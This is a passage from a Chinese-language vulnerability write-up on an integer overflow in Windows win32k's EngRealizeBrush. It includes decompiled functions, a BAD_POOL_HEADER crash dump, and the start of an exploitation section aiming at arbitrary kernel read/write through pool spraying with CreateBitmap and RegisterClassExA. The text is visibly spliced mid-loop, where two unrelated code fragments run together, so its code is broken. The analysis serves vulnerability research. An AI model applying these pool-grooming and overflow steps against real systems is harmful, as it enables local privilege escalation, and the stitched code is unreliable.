      v63 = 0;
      v64 = 0;
      dbmi_cx = cxPatRealized;
      SURFMEM::bCreateDIB( (SURFMEM *)&v63, (struct _DEVBITMAPINFO *)&dbmi_iFormat, *(PVOID *)(pengbrush + 0x20), 0, 0, 0, 0, 0, 1);
      if ( !v63 )
        goto LABEL_47;
_函数 EngRealizeBrush 调用 SURFMEM::bCreateDIB 创建位图_
函数 `SURFMEMOBJ::bCreateDIB` 在根据参数计算位图像素数据区域大小时，由于没有增加 `0x44` 和 `0x40` 两个
`ENGBRUSH` 对象的大小，所以并未发生溢出而得到 `0xFFFFFF8C` 数值，超过函数限制的 `0x7FFFFFFF`
数据区域最大范围，致使函数调用失败。
      if ( BaseAddress )
      {
        if ( a9 )
        {
          eq = bUnk ? (LONGLONG)*((_DWORD *)pdbmi + 3) : cjScanTemp * (LONGLONG)*((_DWORD *)pdbmi + 2);
          if ( eq > 0x7FFFFFFF )
            return 0;
        }
        [...]
      }
_函数 SURFMEMOBJ::bCreateDIB 判断位图像素数据区域大小的有效性_
返回到函数 `EngRealizeBrush` 时，由于位图对象创建失败，因此函数继续向上级返回。前面的章节已经提到，在函数
`pvGetEngRbrush` 中判断 `bGetRealizedBrush` 函数调用返回失败时，将释放刚才分配的缓冲区内存。
编译后在测试环境执行，可以观测到由于整数向上溢出造成分配缓冲区过小、使后续代码逻辑触发缓冲区溢出漏洞导致系统 BSOD 的发生：
    kd> !analyze -v
    *******************************************************************************
    *                                                                             *
    *                        Bugcheck Analysis                                    *
    *                                                                             *
    *******************************************************************************
    BAD_POOL_HEADER (19)
    [...]
    Arguments:
    Arg1: 00000020, a pool block header size is corrupt.
    Arg2: fd6c4250, The pool entry we were looking for within the page.
    Arg3: fd6c4268, The next pool entry.
    Arg4: 4a030018, (reserved)
    [...]
    STACK_TEXT:  
    96f1b53c 83f35083 00000003 e2878267 00000065 nt!RtlpBreakWithStatusInstruction
    96f1b58c 83f35b81 00000003 fd6c4250 000001ff nt!KiBugCheckDebugBreak+0x1c
    96f1b950 83f77c6b 00000019 00000020 fd6c4250 nt!KeBugCheck2+0x68b
    96f1b9cc 936534c3 fd6c4258 00000000 ffa07648 nt!ExFreePoolWithTag+0x1b1
    96f1b9e0 936c9ae6 ffa07648 ffa07648 ffb6e008 win32k!pvGetEngRbrush+0x33
    96f1ba44 936ee723 ffb6e018 00000000 00000000 win32k!EngBitBlt+0x2bf
    96f1baa8 936ee8ab ffa07648 96f1bb10 96f1bb00 win32k!GrePatBltLockedDC+0x22b
    96f1bb54 936eed96 96f1bbe8 0000f0f0 002cf9e8 win32k!GrePolyPatBltInternal+0x176
    96f1bc18 83e941ea 1a0101f5 00f00021 002cf9e8 win32k!NtGdiPolyPatBlt+0x1bc
    96f1bc18 774670b4 1a0101f5 00f00021 002cf9e8 nt!KiFastCallEntry+0x12a
    002cf950 77056217 770561f9 1a0101f5 00f00021 ntdll!KiFastSystemCallRet
    002cf954 770561f9 1a0101f5 00f00021 002cf9e8 GDI32!NtGdiPolyPatBlt+0xc
    002cf980 0088b0c5 1a0101f5 00f00021 002cf9e8 GDI32!PolyPatBlt+0x1e7
_漏洞验证代码触发异常_
根据 WinDBG 捕获的 BSOD 信息显示，发生的异常编码是 `BAD_POOL_HEADER` 错误的内存池头部，异常发生在函数
`pvGetEngRbrush` 调用 `ExFreePoolWithTag` 释放前面分配的 `ENGBRUSH`
缓冲区期间。由于整数溢出导致后续代码逻辑触发缓冲区溢出漏洞，覆盖了下一个内存块的 `POOL_HEADER` 内存块头部结构，在函数
`ExFreePoolWithTag` 中释放当前内存块时，校验同一内存页中的下一个内存块的有效性；没有校验通过则抛出异常码为
`BAD_POOL_HEADER` 的异常。
#### 0x3 利用
前面验证了漏洞的触发机理，接下来将通过该漏洞实现任意地址读写的利用目的。前面的章节已经指出，整数溢出漏洞发生后，在函数后续的代码逻辑中，初始化
`ENGBRUSH` 对象的成员域时，覆盖了下一内存块的头部结构和内存数据。
* * *
###### 内存布局
利用的第一步是内存布局。在以前的分析文章中提到，内核在释放内存块时，如果内存块位于所在内存页的末尾，则不会进行相邻内存块头部结构的有效性验证。根据
Windows 内核池内存分配的逻辑，分配的内存块小于 `0x1000`
字节时，内存块大小越大，其被分配在内存页首地址的概率就越大。而分配较小内存缓冲区时，内核将首先搜索符合当前请求内存块大小的空间，将内存块优先安置在这些空间中。利用内核池风水技术，首先在内核中通过相关
API 分配大量特定大小的内存块以占用对应内存页的起始位置，为漏洞函数分配内存缓冲区时预留内存页末尾的空间，以防止在释放内存时由于
`POOL_HEADER` 内存块头部校验导致的 BSOD 发生。
根据以上的分析，我们当前实现的漏洞验证代码导致函数 `EngRealizeBrush` 分配缓冲区大小为 `0x10` 字节，加上
`POOL_HEADER` 结构的 `8` 字节，总计占用 `0x18` 字节的内存块空间。那就需要在进行内存布局时，提前分配 `0xFE8`
字节的内存块缓冲区。
分配用来占用空间和利用的内存块缓冲区通过熟悉的 `CreateBitmap` 函数实现。函数 `CreateBitmap`
用于根据指定的宽度、高度和颜色格式在内核中创建位图表面对象。调用该函数时，系统最终在内核函数 `SURFMEM::bCreateDIB`
中分配内存缓冲区并初始化位图表面 `SURFACE` 对象和位图像素数据区域，内存块类型为分页会话池（`0x21`）内存。当位图表面对象的总大小在
`0x1000` 字节之内的话，分配内存时，将分配对应位图像素数据大小加 `SURFACE` 管理对象大小的缓冲区，直接以对应的 `SURFACE`
管理对象作为缓冲区头部，位图像素数据紧随其后存储。在当前系统环境下，`SURFACE` 对象的大小为 `0x154` 字节。
这样一来，位图像素数据区域的占用大小就成为：
    0xFE8 - 8 - 0x154 = 0xE8C
当分配位图的宽度为 `4` 的倍数且像素位数格式为 `8` 位时，位图像素数据的大小直接等于宽度和高度的乘积。根据以上，可以通过以下验证代码片段分配大量的
`0xFE8` 字节的内存缓冲区：
    for (LONG i = 0; i lpszMenuName
      if ( v18 && (unsigned int)v18 & 0xFFFF0000 )
      {
        ms_exc.registration.TryLevel = 2;
        RtlInitUnicodeString(&DestinationString, v18);
        ms_exc.registration.TryLevel = -2;
        [...]
        if ( AllocateUnicodeString(&v27, &DestinationString.Length) )
        {
          *((_DWORD *)v9 + 20) = v27.Buffer;
          goto LABEL_45;
        }
        [...]
      }
_函数 InternalRegisterClassEx 分配字符串缓冲区_
在函数 `AllocateUnicodeString` 中调用函数 `ExAllocatePoolWithQuotaTag`
分配进程配额的内存块。由于分配的内存将作为 UNICODE 类型的以零结尾字符串的缓冲区，因此传入参数的分配缓冲区大小为 `2` 加
`lpszMenuName` 字符串的字符个数倍的 `WCHAR` 字符大小。
      if ( UShortAdd(SourceString->Length, 2, &v6) >= 0 )
      {
        v3 = v6;
        v4 = (WCHAR *)ExAllocatePoolWithQuotaTag((POOL_TYPE)0x29, v6, 'xtsU');
        [...]
      }
_函数 AllocateUnicodeString 分配内存缓冲区_
在函数 `ExAllocatePoolWithQuotaTag` 中最终分配的缓冲区大小再额外加上进程内存配额标记的 `4` 字节。
在调用函数 `RegisterClassEx` 时，如果参数 `lpwcx` 的成员域 `lpszMenuName` 指定为 `2` 至 `5`
个字符的字符串，传入函数 `ExAllocatePoolWithQuotaTag` 的第 2 个参数将被设为从 `0x6` 至 `0xc` 以 `2`
递增的数值。由于进程配额的内存块需包含 `4` 字节的配额标记，并且内存缓冲区以 `8` 字节对齐，最终分配的内存块大小为 `0x18` 字节，内存块类型为
`0x21` 分页会话池。验证代码如下：
    CHAR buf[0x10] = { 0 };
    for (LONG i = 0; i < 3000; i++)
    {
        WNDCLASSEXA Class = { 0 };
        sprintf(buf, "CLS_%d", i);
        Class.lpfnWndProc = DefWindowProcA;
        Class.lpszClassName = buf;
        Class.lpszMenuName = "Test";
        Class.cbSize = sizeof(WNDCLASSEXA);
        RegisterClassExA(&Class);
    }
_通过注册窗口类填充内存间隙的验证代码片段_
* * *
###### 溢出覆盖
根据前面章节的分析和 IDA 反汇编代码计算得到 `ENGBRUSH` 结构的部分成员域定义：
    typedef struct _ENGBRUSH
    {
      DWORD dwUnk00;       //<[00,04]
      ULONG cjSize;        //<[04,04] length of the allocation
      DWORD dwUnk08;       //<[08,04]
      DWORD dwUnk0c;       //<[0C,04]